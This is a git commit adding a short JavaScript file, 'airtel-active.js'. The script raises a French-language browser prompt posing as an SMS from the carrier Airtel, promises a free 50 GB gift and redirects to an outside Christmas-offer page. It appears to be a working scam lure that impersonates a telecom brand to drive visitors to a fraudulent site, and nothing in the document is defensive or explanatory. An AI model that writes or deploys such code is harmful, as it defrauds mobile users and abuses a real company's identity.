08dc4a8badc31a0424c97f72c9451dd97359e4b6
trafficbank <153836234+trafficbank@users.noreply.github.com>
2024-12-18 03:17:35 -0800

    Create airtel-active.js

---
+++ airtel-active.js
@@ -0,0 +1,6 @@
+
+var password = 'ACTIVER 50 Go'
+password=prompt('SMS: Félicitations, vous êtes admissible au cadeau Airtel 50 Go, Veuillez appuyer sur OK pour activer maintenant   ','ACTIVER 50 Go');
+if (password != 'ACTIVER 50 Go') {
+location.href='https://get-offre.org/airtel-christmas.html';
+}
